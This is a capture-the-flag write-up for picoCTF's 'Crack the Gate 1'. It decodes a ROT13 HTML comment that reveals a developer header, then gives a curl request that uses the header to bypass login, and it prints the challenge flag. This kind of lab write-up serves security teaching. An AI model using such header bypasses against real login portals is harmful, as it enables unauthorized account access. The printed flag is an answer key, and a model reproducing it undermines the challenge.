# picoCTF – Crack the Gate 1

## Challenge Information

* **CTF Name:** picoCTF
* **Challenge Name:** Crack the Gate 1
* **Category:** Web / Header Manipulation
* **Difficulty:** Easy–Medium
* **Description:**
  A user account is protected behind a login portal. The email is known, but the password is not. The challenge hints that there may be a hidden developer bypass.

---

## TL;DR (Summary)

A ROT13-encoded HTML comment reveals a hidden developer header. Supplying this header bypasses authentication and returns the flag.

---

## Thought Process & Approach

The challenge description suggests that traditional password guessing will not work and hints at a hidden or unintended access method. This makes inspecting the page source a good starting point.

---

## Discovery

Inspecting the HTML source reveals the following comment:

```
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
```

This appears to be encoded text.

---

## Decoding the Hint

Using a cipher identification tool shows that the text is encoded using **ROT13**.

Decoding it gives:

```
<!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
```

This reveals a hidden authentication bypass using a custom HTTP header.

---

## Exploitation

A POST request is sent to the login endpoint with the required header.

Request:

```
curl -X POST http://{your-generated-instance}/login \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
```

---

## Result

The server responds with a successful login and returns the flag:

```
picoCTF{brut4_f0rc4_b3a957eb}
```

---

## Final Answer

```
picoCTF{brut4_f0rc4_b3a957eb}
```
